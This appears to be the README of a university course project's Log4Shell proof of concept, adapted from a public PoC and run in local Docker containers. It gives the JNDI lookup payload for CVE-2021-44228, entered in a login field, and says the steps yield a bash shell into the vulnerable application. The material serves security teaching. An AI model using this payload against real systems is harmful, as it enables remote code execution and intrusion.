# CS4239 Group 6 Log4Shell Proof of Concept (PoC)  

This project is a modified version of this PoC: [Github Link](https://github.com/kozmer/log4j-shell-poc)
CVEs covered:
1. CVE-2021-44228  
2. CVE-2021-45046 (TBD)  

## Requirements
Needs a system with x86_64 (AKA amd64) chipset.
Needs the following software:
1. Docker  
2. docker-compose  

## Instructions to run PoCs  
### CVE-2021-44228\
1. `cd` into root directory of this repo  
2. Run "run_demo.sh" with `./run_demo.sh` in terminal. Keep this terminal open.  
3. Visit "localhost:8080" with your web browser  
4. Enter "${jndi:ldap://localhost:1389/a}" as Username, Password can be anything
5. Press Login.  
6. Revisit the terminal from earlier. A bash shell into the vulnerable application will now be open!